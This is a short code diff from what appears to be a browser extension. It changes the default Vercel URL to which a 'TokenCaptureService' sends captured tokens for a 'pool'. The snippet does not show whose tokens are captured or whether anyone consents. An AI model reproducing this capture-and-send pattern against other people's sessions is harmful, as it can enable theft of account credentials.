@@ -231,7 +231,7 @@ class TokenCaptureService {
       // Get Generator URL from storage or use default
       const result = await chrome.storage.local.get(['generatorUrl'])
       // Default: Production Vercel deployment
-      const generatorUrl = result.generatorUrl || 'https://son1kgenerator-iex2vyt3s-son1kvers3s-projects-c805d053.vercel.app'
+      const generatorUrl = result.generatorUrl || 'https://son1kgenerator-11h1yss5a-son1kvers3s-projects-c805d053.vercel.app'
 
       console.log(`Sending token to pool: ${generatorUrl}`)
 
